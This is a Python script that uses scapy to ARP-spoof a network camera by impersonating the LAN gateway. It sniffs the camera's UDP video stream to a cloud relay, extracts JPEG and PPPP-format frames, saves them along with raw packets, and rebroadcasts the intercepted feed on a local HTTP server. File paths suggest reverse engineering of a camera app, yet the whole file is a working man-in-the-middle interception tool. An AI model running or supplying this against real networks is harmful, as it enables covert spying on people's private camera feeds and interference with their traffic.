#!/usr/bin/env python3
"""
Extract JPEG from camera relay traffic - handles both raw JPEG and PPPP format.
"""
from scapy.all import *
import threading, time, struct, os, sys

CAM_IP = "192.168.1.148"
RELAY_IP = "49.237.71.144"
RELAY_PORT = 22036
OUTPUT_DIR = r"E:\open_camera\apk_analysis\frames"
LOG = open(r"E:\open_camera\apk_analysis\extract_log.txt", "w")

def log(msg):
    t = time.strftime("%H:%M:%S")
    line = f"[{t}] {msg}"
    print(line)
    LOG.write(line + "\n")
    LOG.flush()

os.makedirs(OUTPUT_DIR, exist_ok=True)

frame_count = 0
frame_lock = threading.Lock()
running = True

# Save raw packets for analysis
RAW_DIR = r"E:\open_camera\apk_analysis\raw_packets"
os.makedirs(RAW_DIR, exist_ok=True)
pkt_idx = 0

def spoof_loop():
    conf.verb = 0
    my_mac = "9c:6b:00:cf:27:e7"
    try:
        cam_mac_val = getmacbyip(CAM_IP) or "ff:ff:ff:ff:ff:ff"
        gw_mac_val = getmacbyip("192.168.1.1") or "ff:ff:ff:ff:ff:ff"
    except:
        cam_mac_val = "ff:ff:ff:ff:ff:ff"
        gw_mac_val = "ff:ff:ff:ff:ff:ff"
    log(f"ARP spoof: {CAM_IP} via {my_mac} (cam={cam_mac_val})")
    pkt = Ether(dst=cam_mac_val)/ARP(op=2, pdst=CAM_IP, hwdst=cam_mac_val, psrc="192.168.1.1", hwsrc=my_mac)
    while running:
        sendp(pkt, iface=conf.iface, verbose=False)
        time.sleep(1)

def process(pkt):
    global frame_count, pkt_idx
    if not (pkt.haslayer(IP) and pkt.haslayer(UDP)): return
    if pkt[IP].src != CAM_IP: return
    if pkt[IP].dst != RELAY_IP: return
    if pkt[UDP].dport != RELAY_PORT: return
    
    payload = bytes(pkt[UDP].payload)
    if len(payload) < 20: return
    
    pkt_idx += 1
    
    # Save some raw packets for analysis
    if pkt_idx % 100 == 0:
        with open(os.path.join(RAW_DIR, f"pkt_{pkt_idx:05d}.bin"), 'wb') as f:
            f.write(payload)
    
    # Try direct JPEG detection
    found = False
    for soi in range(len(payload)-3):
        if payload[soi:soi+3] == b'\xff\xd8\xff':
            # Try to find EOI
            for eoi in range(len(payload)-2, soi+3, -1):
                if payload[eoi:eoi+2] == b'\xff\xd9':
                    jpeg = payload[soi:eoi+2]
                    if len(jpeg) > 500:
                        frame_count += 1
                        fname = os.path.join(OUTPUT_DIR, f"jpeg_{frame_count:05d}.jpg")
                        with open(fname, 'wb') as f:
                            f.write(jpeg)
                        if frame_count % 5 == 0:
                            log(f"JPEG saved: {len(jpeg)} bytes (total: {frame_count})")
                        found = True
                        break
            if found: break
    
    if found: return
    
    # Try PPPP format: find 55aa15a8 marker, then decrypt+skip header
    marker = payload.find(b'\x55\xaa\x15\xa8')
    if marker >= 0 and marker + 0x20 + 500 < len(payload):
        # PPPP frame: marker at `marker`, 32-byte header, then JPEG
        jpeg_start = marker + 0x20
        jpeg_data = payload[jpeg_start:]
        # Try to find EOI
        eoi = jpeg_data.rfind(b'\xff\xd9')
        if eoi > 100:
            jpeg = jpeg_data[:eoi+2]
            frame_count += 1
            fname = os.path.join(OUTPUT_DIR, f"pppp_{frame_count:05d}.jpg")
            with open(fname, 'wb') as f:
                f.write(jpeg)
            if frame_count % 5 == 0:
                log(f"PPPP frame: {len(jpeg)} bytes (total: {frame_count})")

# HTTP server
from http.server import HTTPServer, BaseHTTPRequestHandler

LATEST = b''

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/cam.mjpg':
            self.send_response(200)
            self.send_header('Content-Type', 'multipart/x-mixed-replace; boundary=FRAME')
            self.end_headers()
            last = 0
            while running:
                global frame_count, LATEST
                if frame_count > last and LATEST:
                    self.wfile.write(b'--FRAME\r\nContent-Type: image/jpeg\r\n')
                    self.wfile.write(f'Content-Length: {len(LATEST)}\r\n\r\n'.encode())
                    self.wfile.write(LATEST)
                    self.wfile.write(b'\r\n')
                    last = frame_count
                time.sleep(0.05)
        elif self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(b'<html><body><h1>Camera Feed</h1><img src="/cam.mjpg" style="max-width:100%"><br>Saved frames: <a href="/frames">/frames</a></body></html>')
        else:
            self.send_response(404); self.end_headers()

def update_latest():
    global LATEST, frame_count
    while running:
        files = sorted([f for f in os.listdir(OUTPUT_DIR) if f.endswith('.jpg')], reverse=True)
        if files:
            fname = os.path.join(OUTPUT_DIR, files[0])
            if os.path.exists(fname):
                with open(fname, 'rb') as f:
                    LATEST = f.read()
        time.sleep(0.1)

def http_server():
    s = HTTPServer(('0.0.0.0', 8080), H)
    log("HTTP: http://localhost:8080")
    s.serve_forever()

log(f"Relay: {RELAY_IP}:{RELAY_PORT}, Camera: {CAM_IP}")
log(f"Frames: {OUTPUT_DIR}")

threading.Thread(target=spoof_loop, daemon=True).start()
threading.Thread(target=http_server, daemon=True).start()
threading.Thread(target=update_latest, daemon=True).start()
time.sleep(1)

try:
    sniff(filter=f"host {CAM_IP}", prn=process, store=False)
except KeyboardInterrupt:
    pass
except Exception as e:
    log(f"ERROR: {e}")
finally:
    running = False
    LOG.close()
